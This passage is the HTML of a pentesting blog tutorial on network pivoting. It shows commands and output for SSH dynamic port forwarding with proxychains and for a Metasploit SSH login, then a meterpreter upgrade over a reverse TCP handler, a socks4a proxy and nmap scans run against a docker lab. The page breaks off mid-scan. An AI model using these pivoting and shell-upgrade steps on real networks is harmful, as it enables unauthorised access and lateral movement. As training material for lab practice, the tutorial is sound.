@@ -1,0 +1,653 @@
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<title>A Pivot Cheatsheet for Pentesters</title>
+	<meta name="HandheldFriendly" content="True">
+	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+	<link rel="shortcut icon" href="https://nullsweep.com/content/images/size/w256h256/2020/09/logov3_256.png">
+
+	<link rel="stylesheet" type="text/css" href="/assets/build/styles/style.css?v=fd3f5fd25e">
+	<link rel="stylesheet" type="text/css" href="/assets/build/styles/prism.css?v=fd3f5fd25e">
+	
+	
+	
+
+    <meta name="description" content="Quick walkthrough of pivot techniques including ssh, meterpreter, ncat, and netcat.">
+    <link rel="icon" href="https://nullsweep.com/content/images/size/w256h256/2020/09/logov3_256.png" type="image/png">
+    <link rel="canonical" href="https://nullsweep.com/pivot-cheatsheet-for-pentesters/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="amphtml" href="https://nullsweep.com/pivot-cheatsheet-for-pentesters/amp/">
+    
+    <meta property="og:site_name" content="Null Sweep">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="A Pivot Cheatsheet for Pentesters">
+    <meta property="og:description" content="Quick walkthrough of pivot techniques including ssh, meterpreter, ncat, and netcat.">
+    <meta property="og:url" content="https://nullsweep.com/pivot-cheatsheet-for-pentesters/">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1558492426-df14e290aefa?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ">
+    <meta property="article:published_time" content="2019-09-18T23:41:00.000Z">
+    <meta property="article:modified_time" content="2019-09-19T15:44:08.000Z">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="article:tag" content="Technical Guides">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="A Pivot Cheatsheet for Pentesters">
+    <meta name="twitter:description" content="Quick walkthrough of pivot techniques including ssh, meterpreter, ncat, and netcat.">
+    <meta name="twitter:url" content="https://nullsweep.com/pivot-cheatsheet-for-pentesters/">
+    <meta name="twitter:image" content="https://images.unsplash.com/photo-1558492426-df14e290aefa?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Charlie Belmer">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="Pentesting, Technical Guides">
+    <meta name="twitter:site" content="@CharlieBelmer">
+    <meta name="twitter:creator" content="@CharlieBelmer">
+    <meta property="og:image:width" content="1080">
+    <meta property="og:image:height" content="720">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Null Sweep",
+        "url": "https://nullsweep.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://nullsweep.com/content/images/2020/09/wordmark_bw_v4.png"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Charlie Belmer",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://nullsweep.com/content/images/2020/07/Charlie_sm_sq.jpg",
+            "width": 424,
+            "height": 425
+        },
+        "url": "https://nullsweep.com/author/charlie/",
+        "sameAs": [
+            "https://twitter.com/CharlieBelmer"
+        ]
+    },
+    "headline": "A Pivot Cheatsheet for Pentesters",
+    "url": "https://nullsweep.com/pivot-cheatsheet-for-pentesters/",
+    "datePublished": "2019-09-18T23:41:00.000Z",
+    "dateModified": "2019-09-19T15:44:08.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://images.unsplash.com/photo-1558492426-df14e290aefa?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ",
+        "width": 1080,
+        "height": 720
+    },
+    "keywords": "Pentesting, Technical Guides",
+    "description": "I don&#x27;t often come get a chance to use pivot techniques, so I sometimes find\nmyself searching for reminders about various methods and their trade offs. \n\nI put together this list of common pivot techniques I have used, along with a\nquick to setup docker-compose environment to get you playing with each method\nquickly.\n\nAt the end of the article is a quick look cheatsheet with all the key setup\ncommands for each pivot type.\n\nA Fast Pivot Environment\nIf you want to play around with the pivots I dis",
+    "mainEntityOfPage": "https://nullsweep.com/pivot-cheatsheet-for-pentesters/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.75">
+    <link rel="alternate" type="application/rss+xml" title="Null Sweep" href="https://nullsweep.com/rss/">
+    <script defer="" src="https://cdn.jsdelivr.net/ghost/portal@~2.36/umd/portal.min.js" data-i18n="false" data-ghost="https://nullsweep.com/" data-key="6f7ebf21974a26e3ea8a9ed95b" data-api="https://nullsweep.com/ghost/api/content/" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer="" src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="6f7ebf21974a26e3ea8a9ed95b" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://nullsweep.com/" crossorigin="anonymous"></script>
+    
+    <link href="https://nullsweep.com/webmentions/receive/" rel="webmention">
+    <script defer="" src="/public/cards.min.js?v=fd3f5fd25e"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=fd3f5fd25e">
+    <script defer="" src="/public/member-attribution.min.js?v=fd3f5fd25e"></script><style>:root {--ghost-accent-color: #15171A;}</style>
+<style>.gh-portal-account-header{display:flex;flex-direction:column;align-items:center;margin:0 0 32px}.gh-portal-account-header .gh-portal-avatar{margin:6px 0 8px!important}.gh-portal-account-data{margin-bottom:40px}footer.gh-portal-account-footer{display:flex}.gh-portal-account-footer.paid{margin-top:12px}.gh-portal-account-footermenu{display:flex;align-items:center;list-style:none;padding:0;margin:0}.gh-portal-account-footerright{display:flex;flex-grow:1;align-items:center;justify-content:flex-end}.gh-portal-account-footermenu li{margin-right:16px}.gh-portal-account-footermenu li:last-of-type{margin-right:0}.gh-portal-freeaccount-newsletter{display:flex;align-items:center;justify-content:space-between;margin-top:24px}.gh-portal-freeaccount-newsletter .label{display:flex;flex-direction:column;flex-grow:1}.gh-portal-free-ctatext{margin-top:-12px}.gh-portal-cancelcontinue-container{margin:24px 0 32px}.gh-portal-list-detail .gh-portal-email-notice{display:flex;align-items:center;gap:5px;margin-top:6px;color:var(--red);font-weight:500;font-size:1.25rem;letter-spacing:.2px}.gh-portal-email-notice-icon{width:20px;height:20px}.gh-portal-billing-button-loader{width:32px;height:32px;margin-right:-3px;opacity:.6}.gh-portal-product-icon{width:52px;margin-right:12px;border-radius:2px}.gh-portal-account-discountcontainer{position:relative;display:flex;align-items:center}.gh-portal-account-old-price{text-decoration:line-through;color:var(--grey9)!important}.gh-portal-account-tagicon{width:16px;height:16px;color:var(--brandcolor);margin-right:5px;z-index:999}@media (max-width: 390px){.gh-portal-account-footer{padding:0!important}}@media (max-width: 340px){.gh-portal-account-footer{padding:0!important;flex-wrap:wrap;gap:12px}.gh-portal-account-footer .gh-portal-account-footerright{justify-content:flex-start}}.gh-email-suppressed-page-title{margin-bottom:14px}.gh-email-suppressed-page-icon{display:block;width:38px;height:38px;margin:0 auto 18px}.gh-email-suppressed-page-text{padding:0 14px;text-align:center;color:var(--grey6)}.gh-email-faq-footer-text{color:var(--grey8)}.gh-portal-list-detail.email-newsletter .gh-email-faq-page-button{display:block;margin-top:3px}.accountEmail .gh-email-faq-page-button{margin-left:4px}.emailReceivingFAQ .gh-portal-btn-back,.emailReceivingFAQ .gh-portal-btn-back:hover{left:calc(6vmin - 14px)}.emailReceivingFAQ .gh-portal-closeicon-container{right:calc(6vmin - 20px)}@media (max-width: 480px){.emailReceivingFAQ .gh-portal-btn-back,.emailReceivingFAQ .gh-portal-btn-back:hover{left:16px}.emailReceivingFAQ .gh-portal-closeicon-container{right:24px}}.gh-email-faq-page-button{color:var(--brandcolor);cursor:pointer;background:none;transition:color linear .1s;font-size:1.45rem}</style><style>.App{text-align:center}.App-logo{height:40vmin;pointer-events:none}@media (prefers-reduced-motion: no-preference){.App-logo{animation:App-logo-spin infinite 20s linear}}.App-header{background-color:#282c34;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:calc(10px + 2vmin);color:#fff}.App-link{color:#61dafb}@keyframes App-logo-spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}
+</style></head>
+<body class="post-template tag-pentesting tag-technical-guides
+	">
+
+	<div class="site-main">
+
+		<header class="site-header row">
+			<div class="column header-column">
+				<div class="row logo-row">
+					<a href="https://nullsweep.com"><img class="blog-logo" src="https://nullsweep.com/content/images/2020/09/wordmark_bw_v4.png" alt="Blog Logo"></a>
+
+					<div class="nav-container">
+						<!-- [HAMBURGER menu for mobile] -->
+		      			<label for="hamburger">☰</label>
+		      			<input type="checkbox" id="hamburger">
+						<div class="nav-items">
+							<ul class="nav">
+    <li class="nav-devsecops"><a href="https://nullsweep.com/tag/devsecops/">DevSecOps</a></li>
+    <li class="nav-privacy"><a href="https://nullsweep.com/tag/privacy/">Privacy</a></li>
+    <li class="nav-tools"><a href="https://nullsweep.com/tag/tools/">Tools</a></li>
+    <li class="nav-about"><a href="https://nullsweep.com/charlie/">About</a></li>
+</ul>
+
+						</div>
+					</div>
+				</div>
+					
+				<div class="row main-row">
+					<div class="headermsg">
+						<h1 class="mobile-hide"> SECURITY IS AWESOME </h1>
+						<h2 class="mobile-show">SECURITY IS AWESOME </h2>
+						<p>I write about security and privacy. I regularly post original security research, custom tools, and detailed technical guides.</p>
+					</div>
+					<img src="/assets/images/hacker_chibi_nullsweepv2_256.png?v=fd3f5fd25e" class="mascot" alt="Hacker Chibi">
+				</div>
+				<div class="newsletter-header row">
+
+					<div class="newsletter-form-mobile">
+						<form action="https://nullsweep.us17.list-manage.com/subscribe/post?u=7ee26c5715f62787b8ac64274&amp;id=df3b939c69" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate="">
+
+						    <div id="mc_embed_signup_scroll" class="column">
+							<label for="mce-EMAIL" id="newsletter-label">Get the Newsletter</label>
+							<div class="row">
+								<input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="email address" required="">
+							    <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
+							    <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_7ee26c5715f62787b8ac64274_df3b939c69" tabindex="-1" value=""></div>
+							    <div class="clear"><input type="submit" value="Sign Up!" name="subscribe" id="mc-embedded-subscribe" class="button"></div>
+							    </div>
+							</div>
+						</form>
+					</div>
+				</div>
+					<!--
+					<div class="blog-title"><a href="https://nullsweep.com">Null Sweep</a></div>-->
+					<!--
+					<p class="blog-description">Continuous Security, DevOps, and DevSecOps</p>
+				-->
+			</div>
+			
+		</header>
+	
+		
+		
+
+<main class="site-content" role="main">
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="https://nullsweep.com">
+                <img src="https://nullsweep.com/content/images/2020/09/logov3_256.png" alt="Null Sweep icon">
+            <span>Null Sweep</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">—</span>
+    <div class="floating-header-title">A Pivot Cheatsheet for Pentesters</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"></path>
+</svg>
+</div>
+        <a class="floating-header-share-hn" href="https://news.ycombinator.com/submitlink?t=A%20Pivot%20Cheatsheet%20for%20Pentesters&amp;u=https://nullsweep.com/pivot-cheatsheet-for-pentesters/" onclick="window.open(this.href, 'share-hn', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" aria-label="Hacker News" role="img" viewBox="0 0 512 512"><rect width="512" height="512" rx="15%" fill="#f60"></rect><path fill="#fff" d="M124 91h51l81 162 81-164h51L276 293v136h-40V293z"></path></svg>        </a>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=A%20Pivot%20Cheatsheet%20for%20Pentesters&amp;url=https://nullsweep.com/pivot-cheatsheet-for-pentesters/" onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://nullsweep.com/pivot-cheatsheet-for-pentesters/" onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"></path></svg>
+        </a>
+    </div>
+    <progress id="reading-progress" class="progress" value="0" max="12805">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+	<article class="post tag-pentesting tag-technical-guides post-list-box">
+
+
+
+			<header class="post-header">
+				<div class="post-header-wrap">
+					<div class="post-header-text">
+						<h1 class="post-title">A Pivot Cheatsheet for Pentesters</h1>
+						<span class="post-meta"> <time datetime="2019-09-18">18 September 2019</time>
+						</span>
+					</div>
+					<div class="post_hero_img" style="background-image:url(https://images.unsplash.com/photo-1558492426-df14e290aefa?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ)">
+						<div class="color-overlay">
+						</div>
+					</div>
+				</div>
+			</header>
+			
+			<section class="post-wrapper">
+				<section class="sidebar">
+					<div class="newsletter newsletter-box">
+						<h3>Get the Newsletter</h3>
+						<hr>
+						<p> Stay up to date on new content, security news, and some lovingly crafted emails.</p>
+						<div id="mc_embed_signup">
+						<form action="https://nullsweep.us17.list-manage.com/subscribe/post?u=7ee26c5715f62787b8ac64274&amp;id=df3b939c69" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate="">
+						    <div id="mc_embed_signup_scroll">
+							<label for="mce-EMAIL">Your Email Address:</label>
+							<input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="email address" required="">
+						    <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
+						    <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_7ee26c5715f62787b8ac64274_df3b939c69" tabindex="-1" value=""></div>
+						    <div class="clear"><input type="submit" value="Sign Me Up!" name="subscribe" id="mc-embedded-subscribe" class="button"></div>
+						    </div>
+						</form>
+						</div>
+
+						<!--End mc_embed_signup-->
+					</div>
+				</section>
+
+				<section class="post-content">
+					<p>I don't often come get a chance to use pivot techniques, so I sometimes find myself searching for reminders about various methods and their trade offs. </p><p>I put together this list of common pivot techniques I have used, along with a quick to setup docker-compose environment to get you playing with each method quickly.</p><p>At the end of the article is a quick look cheatsheet with all the key setup commands for each pivot type.</p><h2 id="a-fast-pivot-environment">A Fast Pivot Environment</h2><p>If you want to play around with the pivots I discuss below, I put together a <a href="https://github.com/Charlie-belmer/pentest-pivot-example?ref=nullsweep.com">simple docker environment</a> to play with. It has three machines and two networks. The machines:</p><ul><li>A gateway running SSH with access to public and private networks (like a jump host). </li><li>A host running WebGoat vulnerable webapp on the private network only.</li><li>A Metasploit image on the public network only. </li></ul><p>The SSH machine is accessible from localhost on port 20022 instead of 22, but you can also use the metasploit container for all testing.</p><p>You can get this environment running with docker and docker compose by checking out the repository, then running <code>docker-compose build</code> and <code>docker-compose up</code>.</p><h2 id="method-1-pivot-with-ssh-proxychains">Method 1: Pivot with SSH &amp; ProxyChains</h2><p>This method leverages SSH with dynamic port forwarding to create a socks proxy, with proxychains to help with tools that can't use socks proxies. You can leverage this tunnel two ways:</p><ul><li>In a tool, configure a SOCKS proxy and point it to the SSH tunnel. This works great in tools that support it like Burp.</li><li>Run a command with proxychains, which tunnels data over the SSH proxy.</li></ul><p>This method allows mostly complete access to the target network, with few limitations, and is generally my preferred way to access gated networks. It requires the following pre-conditions to leverage:</p><ul><li>Access on target machine</li><li>SSH service running on target machine and reachable from the attacker machine.</li><li>A password compromise or writing of a public key for entry, to a user that allows remote SSH login.</li></ul><p>Non-root accounts may limit some tools from working fully (such as nmap), when creating certain types of packets are root only activities.</p><h3 id="setting-up-the-tunnel">Setting up the tunnel</h3><p>First login with SSH using dynamic port forwarding. Assuming you are using the sample environment:</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token function">ssh</span> -D localhost:9000 -f -N pentester@localhost -p 20022
+</code></pre>
+<!--kg-card-end: markdown--><p>This sets up &nbsp;an SSH tunnel in the background on local port 9000.</p><h3 id="setup-proxychains">Setup ProxyChains</h3><p>In /etc/proxychains4.conf (or similar depending on version), add the following to the end of the file:</p><pre class=" language-conf"><code class=" language-conf">socks5 127.0.0.1 9000
+</code></pre><h3 id="run-commands">Run Commands</h3><p>Here is an nmap scan of the webgoat host. Note I use the network "webgoat" because the docker-compose network sets up this dns name. You could use any normal ip range on the target network instead.</p><pre class=" language-bash"><code class=" language-bash">$ proxychains nmap -sV webgoat
+Nmap scan report <span class="token keyword">for</span> webgoat <span class="token punctuation">(</span>224.0.0.1<span class="token punctuation">)</span>
+Host is up <span class="token punctuation">(</span>0.00027s latency<span class="token punctuation">)</span>.
+rDNS record <span class="token keyword">for</span> 224.0.0.1: all-systems.mcast.net
+Not shown: 998 closed ports
+PORT     STATE SERVICE    VERSION
+8080/tcp <span class="token function">open</span>  http-proxy
+9001/tcp <span class="token function">open</span>  jdbc       HSQLDB JDBC <span class="token punctuation">(</span>Network Compatibility Version 2.3.4.0<span class="token punctuation">)</span>
+</code></pre><h2 id="method-2-pivot-with-meterpreter-and-socks-proxy">Method 2: Pivot With Meterpreter and socks proxy</h2><p>Some servers don't run SSH, and I often like to leverage meterpreter once I find an initial entry vector for a variety of reasons. Similar to SSH, meterpreter can become a socks proxy, though I have generally found it less reliable than SSH. If you are using the docker compose file provided, I include a slightly modified metasploit image on the public network.</p><p>Unfortunately, socks4 proxies only generally support TCP protocols, and certain kinds of traffic won't work well, so full nmap and similar tool usage may not be possible.</p><h3 id="setup-the-connection">Setup the connection</h3><p>We'll run meterpreter over SSH for this example, but the steps would be the same for any meterpreter session once connected. The below will jump from our machine into the metasploit docker container, start metasploit, and create a meterpreter over SSH connection.</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token comment"># Create a shell on the metasploit image</span>
+$ docker <span class="token function">exec</span> -it pivots_metasploit_1 /bin/bash
+root@3456fe097a17:/$ msfconsole
+msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/ssh/ssh_login
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> RHOSTS <span class="token function">ssh</span>
+RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token function">ssh</span>
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> USERNAME pentester
+USERNAME <span class="token operator">=</span><span class="token operator">&gt;</span> pentester
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> PASSWORD letspivot
+PASSWORD <span class="token operator">=</span><span class="token operator">&gt;</span> letspivot
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 172.21.0.2:22 - Success: <span class="token string">'pentester:letspivot'</span> <span class="token string">''</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command shell session 1 opened <span class="token punctuation">(</span>172.21.0.3:42077 -<span class="token operator">&gt;</span> 172.21.0.2:22<span class="token punctuation">)</span> at 2019-09-19 12:50:57 +0000
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanned 1 of 1 hosts <span class="token punctuation">(</span>100% complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
+
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions
+
+Active sessions
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+  Id  Name  Type           Information                              Connection
+  --  ----  ----           -----------                              ----------
+  1         shell unknown  SSH pentester:letspivot <span class="token punctuation">(</span>172.21.0.2:22<span class="token punctuation">)</span>  172.21.0.3:42077 -<span class="token operator">&gt;</span> 172.21.0.2:22 <span class="token punctuation">(</span>172.21.0.2<span class="token punctuation">)</span>
+
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions -u 1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing <span class="token string">'post/multi/manage/shell_to_meterpreter'</span> on session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>: <span class="token punctuation">[</span>1<span class="token punctuation">]</span>
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> SESSION may not be compatible with this module.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Upgrading session ID: 1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting exploit/multi/handler
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 172.21.0.3:4433 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>985320 bytes<span class="token punctuation">)</span> to 172.21.0.2
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 2 opened <span class="token punctuation">(</span>172.21.0.3:4433 -<span class="token operator">&gt;</span> 172.21.0.2:57642<span class="token punctuation">)</span> at 2019-09-19 12:51:09 +0000
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command stager progress: 100.00% <span class="token punctuation">(</span>773/773 bytes<span class="token punctuation">)</span>
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions
+
+Active sessions
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+  Id  Name  Type                   Information                                            Connection
+  --  ----  ----                   -----------                                            ----------
+  1         shell unknown          SSH pentester:letspivot <span class="token punctuation">(</span>172.21.0.2:22<span class="token punctuation">)</span>                172.21.0.3:42077 -<span class="token operator">&gt;</span> 172.21.0.2:22 <span class="token punctuation">(</span>172.21.0.2<span class="token punctuation">)</span>
+  2         meterpreter x86/linux  uid<span class="token operator">=</span>1000, gid<span class="token operator">=</span>1000, euid<span class="token operator">=</span>1000, egid<span class="token operator">=</span>1000 @ 172.20.0.2  172.21.0.3:4433 -<span class="token operator">&gt;</span> 172.21.0.2:57642 <span class="token punctuation">(</span>172.21.0.2<span class="token punctuation">)</span>
+</code></pre>
+<!--kg-card-end: markdown--><p>One slight complication with the docker setup I am showing is the networking. I have setup two internal docker networks, public and private, which in my examples are 172.20.0.0/24 (private) and 172.21.0.0/24 (public). Normally you would use the meterpreter session to enumerate network access, but I am going to skip that here and just setup a proxy to the private network.</p><h3 id="setup-and-run-a-socks-proxy-over-meterpreter">Setup and run a socks proxy over meterpreter</h3><p>Here we add a route to the private network and setup a socks proxy. I change the meterpreter port to the default proxychains port, but you could also use the default port and update /etc/proxychains.conf with the new route if desired.</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token comment"># In Metasploit</span>
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> route add 172.20.0.0/24 2
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Route added
+msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/server/socks4a
+msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> SRVPORT 9050
+SRVPORT <span class="token operator">=</span><span class="token operator">&gt;</span> 9050
+msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run -j
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job 3.
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the socks4a proxy server
+msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> 
+
+<span class="token comment">### Now in a separate command window, I will create a new session</span>
+<span class="token comment">### on the meterpreter container to use nmap and proxychains</span>
+$ docker <span class="token function">exec</span> -it pivots_metasploit_1 /bin/bash
+root@ffd95ec9ce94:/$ proxychains nmap -sT -P0 -p8080,9001 172.20.0.3
+ProxyChains-3.1 <span class="token punctuation">(</span>http://proxychains.sf.net<span class="token punctuation">)</span>
+
+Starting Nmap 7.60 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2019-09-19 13:08 UTC
+<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">&gt;</span>-127.0.0.1:9050-<span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span>-172.20.0.3:8080-<span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span>-OK
+<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">&gt;</span>-127.0.0.1:9050-<span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span>-172.20.0.3:9001-<span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span>-OK
+Nmap scan report <span class="token keyword">for</span> 172.20.0.3
+Host is up <span class="token punctuation">(</span>0.0025s latency<span class="token punctuation">)</span>.
+
+PORT     STATE SERVICE
